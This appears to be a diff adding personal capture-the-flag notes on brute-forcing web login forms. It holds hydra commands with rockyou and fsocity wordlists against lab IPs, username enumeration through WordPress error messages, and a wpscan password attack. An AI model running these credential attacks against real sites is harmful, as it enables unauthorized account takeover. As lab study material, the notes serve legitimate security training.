@@ -1,0 +1,21 @@
+to bruteforce into web login form
+
+hydra -l molly -P /root/Desktop/Tools/wordlists/rockyou.txt 10.10.249.51 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+hydra -V -L /root/fsocity.dic -p random 10.10.233.113 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
+
+check the burp suite for the user parameter and password
+
+And also for the wrong case error names: Invalid usernmae or incorrect
+
+-----Very Important-----------------
+this cmd is used to find the username
+
+hydra -V -L /root/fsocity.dic -p random 10.10.233.113 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"
+
+To find the password in the wordpress website
+wpscan -v -U /root/user.txt -P /root/fsocity.dic --url http://10.10.233.113/wp-login.php 
+
+or you can also use hydra
+
+hydra -V -l username -P /root/fsocity.dic 10.10.233.113 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Error message whatever comes in the website"
